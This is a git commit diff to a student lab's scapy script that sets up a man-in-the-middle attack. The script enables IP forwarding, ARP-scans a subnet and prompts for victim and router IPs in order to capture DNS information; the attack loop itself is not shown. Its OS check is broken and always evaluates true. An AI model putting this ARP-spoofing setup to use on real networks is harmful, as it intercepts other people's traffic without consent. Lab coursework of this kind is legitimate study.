0fae487694a381ebf7a67781b64f922b179be70f
flizze <alexandre.bel@ynov.com>
2022-12-17 15:16:21 +0100

    better users info

--- reseau/tp5/mitm.py
+++ reseau/tp5/mitm.py
@@ -2,11 +2,30 @@ from scapy.all import ARP, Ether, srp
 import scapy.all as scap
 import os
 import time
+import platform
 
-os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
+os.system('clear')
 
-print("Enter network ip : (example : 192.168.1.0/24)")
+version = platform.version()
+split1 = version.split("-")[1]
+split2 = split1.split(" ")[0]
+
+if split2 == "Ubuntu" or "Debian":
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
+
+print('     -------------------------')
+print("     |MITM, GET INFO FROM DNS|")
+print('     -------------------------')
+print("")
+print("Enter network ip : (example : 192.168.1.0/24)", "\n")
+
 target_ip = input()
+
+for x in range (0,4):  
+    b = "Scanning" + "." * x
+    print (b, end="\r")
+    time.sleep(0.5)
+
 arp = ARP(pdst=target_ip)
 ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 packet = ether/arp
@@ -25,7 +44,7 @@ print("macs in the network", mac)
 
 print("Enter victim ip (1, 2, 3,...)")
 victim = input()
-print("Enter router ip (1, 2, 3, ...) Usually ends by .254")
+print("Enter router ip (1, 2, 3,...) Usually ends by .254")
 router = input()
 
 while True:
